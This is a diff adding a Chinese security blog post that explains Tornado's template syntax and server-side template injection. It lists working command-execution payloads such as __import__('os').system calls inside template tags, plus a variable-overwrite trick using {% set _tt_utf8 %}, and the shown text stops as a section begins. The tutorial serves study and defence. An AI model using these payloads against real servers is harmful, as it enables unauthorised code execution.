@@ -1,0 +1,1364 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head><!-- hexo injector head_begin start --><script defer src="/injector/toolbox.js"></script><!-- hexo injector head_begin end -->
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/apple-touch-icon.png">
+  <link rel="icon" href="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/favicon.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Tr0y">
+  <meta name="keywords" content="Tr0y, tr0y, Hexo, Blog, 博客, 信息安全">
+  
+    <meta name="description" content="本来以为 Flask + mako 够用了。最近老遇到需要用到 Tornado 知识点的地方。好好好，我学，我学还不行吗？">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SecMap - SSTI（Tornado）">
+<meta property="og:url" content="https://www.tr0y.wang/2022/08/05/SecMap-SSTI-tornado/">
+<meta property="og:site_name" content="Tr0y&#39;s Blog">
+<meta property="og:description" content="本来以为 Flask + mako 够用了。最近老遇到需要用到 Tornado 知识点的地方。好好好，我学，我学还不行吗？">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://blogcovers-1252075454.cos.ap-shanghai.myqcloud.com/secmap.jpg/cover">
+<meta property="article:published_time" content="2022-08-05T14:47:44.000Z">
+<meta property="article:modified_time" content="2025-04-15T14:01:31.000Z">
+<meta property="article:author" content="Tr0y">
+<meta property="article:tag" content="Web">
+<meta property="article:tag" content="SecMap">
+<meta property="article:tag" content="SSTI">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://blogcovers-1252075454.cos.ap-shanghai.myqcloud.com/secmap.jpg/cover">
+  
+  
+  
+  <title>SecMap - SSTI（Tornado） - Tr0y&#39;s Blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+  
+<link rel="stylesheet" href="/css/my.css">
+<link rel="stylesheet" href="/css/my-piczoom.css">
+<link rel="stylesheet" href="/css/my-code.css">
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"www.tr0y.wang","root":"/","version":"1.9.2","typing":{"enable":true,"typeSpeed":60,"cursorChar":"丨","loop":false,"scope":["archives","post","tags","categories","about","links","page","404"]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":"🌧"},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":true,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":5},"lazyload":{"enable":true,"loading_img":"https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":false,"baidu":"8e9bf819abf5fa586aeb29b27a17930f","google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"HvSx6ik6SYrERWriMqKHJgxY-gzGzoHsz","app_key":"Ehx7kqAi6icjCXaw5jdD5sIs","server_url":"https://hvsx6ik6.lc-cn-n1-shared.com","path":"window.location.pathname","ignore_local":true}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+    <!-- Baidu Analytics -->
+    <script async>
+      if (!Fluid.ctx.dnt) {
+        var _hmt = _hmt || [];
+        (function() {
+          var hm = document.createElement("script");
+          hm.src = "https://hm.baidu.com/hm.js?8e9bf819abf5fa586aeb29b27a17930f";
+          var s = document.getElementsByTagName("script")[0];
+          s.parentNode.insertBefore(hm, s);
+        })();
+      }
+    </script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+  
+
+
+
+  
+<!-- hexo injector head_end start --><script defer src="/injector/post.js"></script><!-- hexo injector head_end end --><meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="Tr0y's Blog" type="application/atom+xml">
+</head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Tr0y&#39;s Blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-books"></i>
+                生命线
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-archive-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/gallery/">
+                <i class="iconfont icon-images"></i>
+                摄影集
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/page.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="SecMap - SSTI（Tornado）"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2022-08-05 14:47" pubdate>
+          2022年8月5日 14:47:44
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          <!-- compatible with older versions-->
+          16k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          <!-- compatible with older versions-->
+          101 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="leancloud-page-views"></span> 次
+        </span>
+        
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar category-bar" style="margin-right: -1rem">
+    
+
+
+
+
+
+<div class="category-list">
+  
+  
+    
+    
+    
+    <div class="category row nomargin-x">
+      <a class="category-item 
+          list-group-item category-item-action col-10 col-md-11 col-xm-11" title="经验总结"
+        id="heading-14f81b61393e65e2be86c2b4bcc0434a" role="tab" data-toggle="collapse" href="#collapse-14f81b61393e65e2be86c2b4bcc0434a"
+        aria-expanded="true"
+      >
+        经验总结
+        <span class="list-group-count">(85)</span>
+        <i class="iconfont icon-arrowright"></i>
+      </a>
+      
+      <div class="category-collapse collapse show" id="collapse-14f81b61393e65e2be86c2b4bcc0434a"
+           role="tabpanel" aria-labelledby="heading-14f81b61393e65e2be86c2b4bcc0434a">
+        
+        
+          
+          
+  <div class="category-post-list">
+    
+    
+      
+      
+        <a href="/2021/12/31/2021/" title="2021 年度总结"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">2021 年度总结</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2021/01/12/flag-in-2021/" title="2021，来立些 flag 吧"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">2021，来立些 flag 吧</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2023/01/31/2022/" title="2022 年度总结"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">2022 年度总结</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2024/03/15/2023/" title="2023 年度总结"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">2023 年度总结</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2024/05/06/%E4%BA%91%E5%8D%97%E4%B9%8B%E6%97%85/" title="2024 云南之旅"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">2024 云南之旅</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2025/03/14/2024/" title="2024 年度总结"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">2024 年度总结</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2025/02/20/%E6%96%90%E6%B5%8E%E4%B9%8B%E6%97%85/" title="2024 🇫🇯 斐济之旅"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">2024 🇫🇯 斐济之旅</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2019/06/02/CSRF%E6%8C%87%E5%8C%97/" title="CSRF 指北"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">CSRF 指北</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2017/06/07/CtfMiscStega/" title="CTF 杂项之隐写术"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">CTF 杂项之隐写术</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2020/09/14/DNS-1-basic/" title="DNS 安全（一）：基础知识复习"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">DNS 安全（一）：基础知识复习</span>
+        </a>
+      
+    
+      
+      
+        <a href="/categories/%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/" class="list-group-item list-group-item-action">
+          <span class="category-post">More...</span>
+        </a>
+        
+  </div>
+
+          
+  
+    
+    
+    
+    <div class="category-sub row nomargin-x">
+      <a class="category-subitem collapsed
+          list-group-item category-item-action col-10 col-md-11 col-xm-11" title="过程记录"
+        id="heading-82bd63cbf8d855f8a95d66283f2e4114" role="tab" data-toggle="collapse" href="#collapse-82bd63cbf8d855f8a95d66283f2e4114"
+        aria-expanded="false"
+      >
+        过程记录
+        <span class="list-group-count">(1)</span>
+        <i class="iconfont icon-arrowright"></i>
+      </a>
+      
+      <div class="category-collapse collapse " id="collapse-82bd63cbf8d855f8a95d66283f2e4114"
+           role="tabpanel" aria-labelledby="heading-82bd63cbf8d855f8a95d66283f2e4114">
+        
+        
+          
+  <div class="category-post-list">
+    
+    
+      
+      
+        <a href="/2023/12/22/qwb2023-pyjail/" title="2023 强网杯三道 pyjail 的题解"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">2023 强网杯三道 pyjail 的题解</span>
+        </a>
+      
+    
+  </div>
+
+        
+      </div>
+    </div>
+  
+        
+      </div>
+    </div>
+  
+</div>
+
+
+  </aside>
+
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">SecMap - SSTI（Tornado）</h1>
+            
+              <p class="note note-info">
+                
+                  
+                    本文最后更新于：2 个月前
+                  
+                
+              </p>
+            
+            
+              <div class="markdown-body">
+                
+                <p>本来以为 Flask + mako 够用了。最近老遇到需要用到 Tornado 知识点的地方。好好好，我学，我学还不行吗？</p>
+<span id="more"></span>
+<h2 id="光速入门">光速入门</h2>
+<p>首先当然要看官方文档了：</p>
+<p>https://www.tornadoweb.org/en/stable/</p>
+<p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-SSTI-tornado/a2f41228-2885-4d21-963d-88efc2065cd6.png!blog" srcset="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif" lazyload /></p>
+<p>反正就是一个字：快。</p>
+<p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-SSTI-tornado/b48e4fdd-816c-47e6-bc56-7434cbe09fd0.png!blog" srcset="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif" lazyload /></p>
+<p>单线程能够达到这么高的并发，属实有点牛逼。</p>
+<p>根据文档，Tornado 大致提供了三种不同的组件：</p>
+<ul>
+<li>Web 框架</li>
+<li>HTTP 服务端以及客户端</li>
+<li>异步的网络框架，可以用来实现其他网络协议</li>
+</ul>
+<p>那么显然，本文重点关注第一点：Web 框架。</p>
+<h3 id="tornado-web-服务例子">Tornado web 服务例子</h3>
+<p>下面看一个示例：<br />
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> tornado.ioloop, tornado.web<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">IndexHandler</span>(tornado.web.RequestHandler):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">get</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-variable language_">self</span>.get_argument(<span class="hljs-string">&#x27;a&#x27;</span>))<br>        <span class="hljs-variable language_">self</span>.write(<span class="hljs-string">&quot;get!&quot;</span>)<br><br><br>app = tornado.web.Application(<br>    [(<span class="hljs-string">&#x27;/&#x27;</span>, IndexHandler)],<br>)<br>app.listen(<span class="hljs-number">8888</span>)<br>tornado.ioloop.IOLoop.current().start()<br></code></pre></td></tr></table></figure></p>
+<p>非常简洁。</p>
+<p>上面这个例子需要注意的有这几点：</p>
+<ul>
+<li>继承 <code>tornado.web.RequestHandler</code> 之后就可以定制不同请求方式要执行的函数。如果某个请求方式没有对应的函数，则会返回 405，也就是 <code>Method Not Allowed</code></li>
+<li>路径对应的 endpoint 不需要 <code>return</code>，直接用 <code>self.write</code>、<code>self.render_string</code>、<code>self.render</code> 等等就可以返回响应内容</li>
+<li>获取参数用 <code>self.get_argument</code>，如果不指定默认值，那么客户端没传参的时候会返回 400，也就是 <code>Bad Request</code></li>
+</ul>
+<h3 id="模板语法">模板语法</h3>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> tornado.template <span class="hljs-keyword">as</span> template<br><br>payload = <span class="hljs-string">&quot;&#123;&#123;1+1&#125;&#125;&quot;</span><br><span class="hljs-built_in">print</span>(template.Template(payload).generate())<br></code></pre></td></tr></table></figure>
+<p>这就是最简单的一个实验脚本了。当然也可以通过 <code>template.Loader</code> 加载本地的模板文件；以及可以在 <code>generate</code> 中指定任意参数，从而可以在模板字符串中接受它。这些与 jinja2 都非常类似。</p>
+<ol type="1">
+<li><code>&#123;&#123; ... &#125;&#125;</code>：里面直接写 python 语句即可，没有经过特殊的转换。默认输出会经过 html 编码</li>
+<li><code>&#123;% ... %&#125;</code>：内置的特殊语法，有以下几种规则
+<ol type="1">
+<li><code>&#123;# ... #&#125;</code>：注释</li>
+<li><code>&#123;% apply *function* %&#125;...&#123;% end %&#125;</code>：用于执行函数，<code>function</code> 是函数名。<code>apply</code> 到 <code>end</code> 之间的内容是函数的参数</li>
+<li><code>&#123;% autoescape *function* %&#125;</code>：用于设置当前模板文件的编码方式。</li>
+<li><code>&#123;% block *name* %&#125;...&#123;% end %&#125;</code>：引用定义过的模板段，通常来说会配合 <code>extends</code> 使用。感觉 <code>block</code> 同时承担了定义和引用的作用，这个行为不太好理解，比较奇怪。比如 <code>&#123;% block name %&#125;a&#123;% end %&#125;&#123;% block name %&#125;b&#123;% end %&#125;</code> 的结果是 <code>bb</code>...</li>
+<li><code>&#123;% comment ... %&#125;</code>：也是注释</li>
+<li><code>&#123;% extends *filename* %&#125;</code>：将模板文件引入当前的模板，配合 <code>block</code> 食用。使用 <code>extends</code> 的模板是比较特殊的，需要有 template loader，以及如果要起到继承的作用，需要先在加载被引用的模板文件，然后再加载引用的模板文件</li>
+<li><code>&#123;% for *var* in *expr* %&#125;...&#123;% end %&#125;</code>：等价与 python 的 for 循环，可以使用 <code>&#123;% break %&#125;</code> 和 <code>&#123;% continue %&#125;</code></li>
+<li><code>&#123;% from *x* import *y* %&#125;</code>：等价与 python 原始的 <code>import</code></li>
+<li><code>&#123;% if *condition* %&#125;...&#123;% elif *condition* %&#125;...&#123;% else %&#125;...&#123;% end %&#125;</code>：等价与 python 的 <code>if</code></li>
+<li><code>&#123;% import *module* %&#125;</code>：等价与 python 原始的 <code>import</code></li>
+<li><code>&#123;% include *filename* %&#125;</code>：与手动合并模板文件到 <code>include</code> 位置的效果一样（<code>autoescape</code> 是唯一不生效的例外）</li>
+<li><code>&#123;% module *expr* %&#125;</code>：模块化模板引用，通常用于 UI 模块。这里有个例子挺好的，可以参考下如何使用：https://wizardforcel.gitbooks.io/tornado-overview/content/17.html</li>
+<li><code>&#123;% module Template("foo.html", arg=42) %&#125;</code>：</li>
+<li><code>&#123;% raw *expr* %&#125;</code>：就是常规的模板语句，只是输出不会被转义</li>
+<li><code>&#123;% set *x* = *y* %&#125;</code>：创建一个局部变量</li>
+<li><code>&#123;% try %&#125;...&#123;% except %&#125;...&#123;% else %&#125;...&#123;% finally %&#125;...&#123;% end %&#125;</code>：等同于 python 的异常捕获相关语句</li>
+<li><code>&#123;% while *condition* %&#125;... &#123;% end %&#125;</code>：等价与 python 的 while 循环，可以使用 <code>&#123;% break %&#125;</code> 和 <code>&#123;% continue %&#125;</code></li>
+<li><code>&#123;% whitespace *mode* %&#125;</code>：设定模板对于空白符号的处理机制，有三种：<code>all</code> - 不做修改、<code>single</code> - 多个空白符号变成一个、<code>oneline</code> - 先把所有空白符变成空格，然后连续空格变成一个空格</li>
+</ol></li>
+<li><code>apply</code> 的内置函数列表：
+<ol type="1">
+<li><code>linkify</code>：把链接转为 html 链接标签（<code>&lt;a href="...</code>）</li>
+<li><code>squeeze</code>：作用与 <code>&#123;% whitespace oneline %&#125;</code> 一样</li>
+</ol></li>
+<li><code>autoescape</code> 的内置函数列表：
+<ol type="1">
+<li><code>xhtml_escape</code>：html 编码</li>
+<li><code>json_encode</code>：转为 json</li>
+<li><code>url_escape</code>：url 编码</li>
+</ol></li>
+<li>其他函数（需要在 settings 中指定）
+<ol type="1">
+<li><code>xhtml_unescape</code>：html 解码</li>
+<li><code>url_unescape</code>：url 解码</li>
+<li><code>json_decode</code>：解开 json</li>
+<li><code>utf8</code>：utf8 编码</li>
+<li><code>to_unicode</code>：utf8 解码</li>
+<li><code>native_str</code>：utf8 解码</li>
+<li><code>to_basestring</code>：历史遗留功能，现在和 <code>to_unicode</code> 是一样的作用</li>
+<li><code>recursive_unicode</code>：把可迭代对象中的所有元素进行 <code>to_unicode</code></li>
+</ol></li>
+</ol>
+<p>由于通常模板实现时还会引入一些特殊的全局变量或者函数，通过 <code>locals()</code> 与 <code>globals()</code>（或者看代码）可以挖掘一些没有在文档中说明的隐藏函数：</p>
+<ul>
+<li><code>escape</code>：就是 <code>xhtml_escape</code></li>
+<li><code>datetime</code>：就是 python 标准库里的 datetime</li>
+<li><code>_tt_utf8</code>：就是 <code>utf8</code></li>
+</ul>
+<p>还有一个比较有趣的隐藏变量：<code>__loader__</code>，这个东西下面有个 <code>get_source</code>，它的作用是获取当前模板翻译后的代码，后面会用到。</p>
+<p>至此，我们可以发现 Tornado 的模板是非常灵活的，几乎不设限。相较 Flask 设置的“沙箱”，对于研发来说 Tornado 要方便很多，但同时也方便了攻击者。</p>
+<p>好了，到这里，我相信你和我一样，已经精通 Tornado 了。</p>
+<h2 id="攻击思路">攻击思路</h2>
+<p>Tornado 你可以理解为是 Flask + jinja2，所以 Tornado 的模板 <code>tornado.template</code> 其实也可以用在 Flask 里。为了能够讲清楚 Tornado 的 SSTI，我打算先写 <code>tornado.template</code> 再写 <code>tornado.template</code> + <code>tornado.web.Application</code>，这样有个逐步递进的过程，更加容易理解。</p>
+<h3 id="ssti-in-tornado.template">SSTI in tornado.template</h3>
+<h4 id="常规手法">常规手法</h4>
+<p>由于 Tornado 模板实在过于开放，和 mako 差不多。所以 SSTI 手法基本上兼容 jinja2、mako 的 SSTI 手法，思路非常灵活。</p>
+<p>我感觉绕过限制的话，直接用 Python 沙箱逃逸的思路即可，甚至连那里面的 Unicode 规范化的 bypass 姿势也可以直接用。所以我觉得在常规手法上，这里没有太多需要补充的点。</p>
+<p>这里列举一下可以直接执行代码的方式吧：</p>
+<ol type="1">
+<li><code>&#123;&#123; __import__("os").system("whoami") &#125;&#125;</code></li>
+<li><code>&#123;% apply __import__("os").system %&#125;id&#123;% end %&#125;</code></li>
+<li><code>&#123;% raw __import__("os").system("whoami") %&#125;</code></li>
+</ol>
+<p>下面说一些稍微高级点的技巧。</p>
+<h4 id="临时代码的变量覆盖">临时代码的变量覆盖</h4>
+<p>Tornado 在生成模板的时候会生成一份 python 代码，这份代码就是模板翻译后的临时代码（不知道有没有更好的称呼。。）</p>
+<p>所以先来浅析一下 Tornado 模板相关的源码。</p>
+<p>整个分析过程我就不啰嗦了，总结一下：在 <code>site-packages/tornado/template.py</code> 的 <code>class Template</code> 下，<code>__init__</code> 负责读取模板，然后调用 <code>_generate_python</code> 将模板内容转为 Python 代码，转换过程会用到 <code>_CodeWriter</code>，它负责把生成的 Python 代码写入 <code>String.IO</code> 实例中。拿到临时代码之后，将生成的 Python 代码编译为字节码。在执行 <code>generate</code> 的时候，会将临时代码用 <code>exec</code> 执行。</p>
+<p>那么如果能看到临时代码的话，分析起来就比较方便了。这有很多种办法。</p>
+<p>例如利用上面提到过的 <code>__loader__.get_source</code>。先看下一份临时代码长啥样：</p>
+<p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-SSTI-tornado/ab0763a5-1948-417b-8bfd-d6b3b5e331d5.png!blog" srcset="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif" lazyload /></p>
+<p>先尝试一下简单的覆盖：<code>Template('&#123;&#123;print(__loader__.get_source(1))&#125;&#125;&#123;% set _tt_utf8 = __import__("os").system %&#125;&#123;&#123;"id"&#125;&#125;').generate()</code></p>
+<p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-SSTI-tornado/80d55c9b-3907-4ee7-8982-5562579f6e17.png!blog" srcset="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif" lazyload /></p>
+<p>可以看到，由于 set 了 <code>_tt_utf8</code>，<code>_tt_utf8</code> 会被 Python 解释器视为局部变量，所以临时代码在执行到打印源码那一段的时候就抛出了错误（下面会具体解释原因）。所以只需要去掉前面打印源码的模板代码，就可以执行命令了：</p>
+<p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-SSTI-tornado/3d22e7dd-6fdc-4bb4-a8a6-dcb43aa9f2a0.png!blog" srcset="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif" lazyload /></p>
+<p>所以这时需要看代码的话，在 <code>Template.__init__</code> 中打印就可以了：</p>
+<p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-SSTI-tornado/80e7c628-faf5-47e9-afb0-1edf3c147190.png!blog#width-zoom7" srcset="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif" lazyload /></p>
+<p>那么这里还遗留了最后一个问题：为什么 set <code>_tt_utf8</code> 之后，原先命名空间里的 <code>_tt_utf8</code> 就失效了？答案在 <code>Template.__init__</code> 调用的 <code>exec_in</code> 里，这个函数位于 <code>site-packages/tornado/util.py</code> 中，其实就是一个指定了 globals 的 <code>exec</code>。所以这种场景可以抽象为：<br />
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs py">namespace = &#123;&#125;<br><br>source_code = <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">def test():</span><br><span class="hljs-string">    print(str(1))</span><br><span class="hljs-string">    str = id</span><br><span class="hljs-string">    print(str)</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br><span class="hljs-built_in">exec</span>(<br>    <span class="hljs-built_in">compile</span>(<br>        source_code,<br>        <span class="hljs-string">&quot;&lt;string&gt;&quot;</span>, <span class="hljs-string">&quot;exec&quot;</span>,<br>    ),<br>    namespace,<br>    <span class="hljs-literal">None</span><br>)<br>namespace[<span class="hljs-string">&quot;test&quot;</span>]()<br><span class="hljs-comment"># 源码中用到了 typing.cast，</span><br><span class="hljs-comment"># 这个不用管，它通常用于声明动态生成的变量的类型，</span><br><span class="hljs-comment"># 是留给类型检查工具使用的。</span><br></code></pre></td></tr></table></figure></p>
+<p>其实还可以进一步抽象为：<br />
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">def</span> <span class="hljs-title function_">test</span>():<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">str</span>(<span class="hljs-number">1</span>))<br>    <span class="hljs-built_in">str</span> = <span class="hljs-built_in">id</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">str</span>)<br><br>test()<br></code></pre></td></tr></table></figure></p>
+<p>这段代码执行会报 <code>UnboundLocalError: local variable 'str' referenced before assignment</code>。</p>
+<p>Python 官方对此给出的回答是：<br />
+<img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-SSTI-tornado/e92f98b7-798c-43e2-b716-c1710974d15d.png!blog" srcset="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif" lazyload /></p>
+<p>在函数体中任意位置对变量重新赋值，这个变量在执行的时候就会被统一认定为是局部变量，所以 <code>str</code> 就是 <code>referenced before assignment</code> 了。</p>
+<p>所以我们在用 <code>&#123;% set %&#125;</code> 来玩变量覆盖的时候要特别小心这个陷阱。</p>
+<p>掌握如何覆盖变量之后，我们就可以探索一些更加有趣的技巧了。例如不用 <code>(</code>、<code>)</code> 来完成命令执行：</p>
